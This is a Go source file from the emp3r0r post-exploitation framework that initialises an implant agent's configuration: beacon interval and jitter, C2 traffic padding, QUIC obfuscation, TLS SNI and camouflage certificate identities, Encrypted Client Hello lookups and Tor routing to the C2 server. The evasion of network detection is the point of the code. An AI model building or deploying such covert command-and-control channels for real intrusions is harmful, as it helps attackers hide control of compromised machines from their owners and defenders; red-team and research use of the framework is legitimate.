package common

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var RuntimeConfig = &def.Config{}

func InitConfig() (err error) {
	configData, err := util.ExtractData()
	if err != nil {
		return fmt.Errorf("read config: %v", err)
	}

	// parse CBOR
	err = def.ReadCBORConfig(configData, RuntimeConfig)
	if err != nil {
		short_view := configData
		if len(configData) > 100 {
			short_view = configData[:100]
		}
		return fmt.Errorf("parsing %d bytes of CBOR data (%s...): %v", len(configData), short_view, err)
	}

	// Safe defaults
	if RuntimeConfig.PollInterval == 0 {
		RuntimeConfig.PollInterval = 60
	}
	if RuntimeConfig.Jitter == 0 {
		RuntimeConfig.Jitter = 20
	}
	if RuntimeConfig.PollWindow == 0 {
		RuntimeConfig.PollWindow = 5
	}

	// Control-frame padding is a sender-side knob; 0 disables it.
	transport.SetC2Padding(RuntimeConfig.PaddingMin, RuntimeConfig.PaddingMax)

	// QUIC datagram obfuscation: on by default, opt out for stock QUIC.
	transport.SetQUICStandardKey(RuntimeConfig.QUICStandardKey)
	if RuntimeConfig.C2ChannelMode == def.C2ChannelModeQUIC && RuntimeConfig.C2TransportProxy != "" {
		logging.Warningf("QUIC C2 transport does not support proxies; ignoring C2TransportProxy=%s", RuntimeConfig.C2TransportProxy)
	}

	// C2 TLS SNI override and stable mesh mTLS identity.
	transport.SetC2ServerName(RuntimeConfig.SNI)
	transport.SetMeshCamouflageIdentity(RuntimeConfig.CamouflageCertOrg, RuntimeConfig.CamouflageCertCN)

	// ECH for the C2 TLS connection: fetch the ECHConfigList from the domain's
	// HTTPS RR over DoH. Disabled when ECHServerName is empty.
	transport.SetECHConfig(RuntimeConfig.ECHServerName, RuntimeConfig.DoHServer)

	// CC Address. An explicit http:// or https:// URL is authoritative: it lets
	// http_poll use TLS (directly or through a TLS-terminating front proxy)
	// without changing the channel wrapper.
	def.CCAddress = strings.TrimSuffix(RuntimeConfig.CCAddress, "/")
	explicitURL := strings.HasPrefix(def.CCAddress, "http://") ||
		strings.HasPrefix(def.CCAddress, "https://")
	isTor := netutil.IsTor(def.CCAddress)
	if !isTor {
		// check if it is an onion address without scheme
		host := def.CCAddress
		if strings.Contains(host, ":") {
			host = strings.Split(host, ":")[0]
		}
		if strings.HasSuffix(host, ".onion") {
			isTor = true
		}
	}

	if isTor {
		// if scheme is missing, add http
		if !strings.HasPrefix(def.CCAddress, "http") {
			def.CCAddress = fmt.Sprintf("http://%s", def.CCAddress)
		}
		// if port is missing, add 80? No, Tor handles it.
		// ensure no trailing slash
		def.CCAddress = strings.TrimSuffix(def.CCAddress, "/")

		if RuntimeConfig.C2TransportProxy == "" {
			RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
		}
	} else if RuntimeConfig.UseKCP {
		RuntimeConfig.CCH2Port = RuntimeConfig.KCPClientPort
		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCH2Port)
	} else if explicitURL {
		// Keep the configured scheme, host and port. This is how an operator
		// reaches http_poll through an HTTPS front proxy.
	} else if RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
		def.CCAddress = fmt.Sprintf("http://%s:%s", def.CCAddress, RuntimeConfig.CCHTTPPort)
	} else {
		def.CCAddress = fmt.Sprintf("https://%s:%s", def.CCAddress, RuntimeConfig.CCH2Port)
	}

	// CA
	transport.SetCACrtPEM([]byte(RuntimeConfig.CAPEM))

	return err
}

// OfflineGraceSeconds returns the removal deadline this agent reports to the
// C2. The agent owns the policy; the C2 only honours the value.
func OfflineGraceSeconds() int {
	if RuntimeConfig.OfflineGrace > 0 {
		return RuntimeConfig.OfflineGrace
	}
	interval := RuntimeConfig.PollInterval
	if interval <= 0 {
		interval = 60
	}
	window := RuntimeConfig.PollWindow
	if window <= 0 {
		window = 5
	}
	return interval + window + interval/2
}
